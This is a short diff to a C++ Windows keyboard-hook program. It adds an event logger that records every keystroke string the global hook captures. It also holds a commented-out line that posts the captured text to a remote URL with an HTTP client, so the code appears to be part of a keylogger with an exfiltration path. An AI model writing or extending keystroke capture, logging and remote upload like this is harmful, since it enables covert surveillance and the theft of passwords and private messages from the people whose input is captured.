@@ -4,6 +4,8 @@
 
 #include "KeyboardHandler.h"
 
+#include "EventLogger.h"
+
 
 boolean checkModifierStatus(const int vkCode) {
     return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
@@ -46,6 +48,8 @@ LRESULT CALLBACK KeyboardCallback(const int nCode, const WPARAM wParam, const WP
         }
 
         printf("%s\n", final.c_str());
+
+        EventLogger::getInstance().logEvent(final);
 
         //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
         // cpr::Body{"{\"text\": \"" + body + "\"}"});
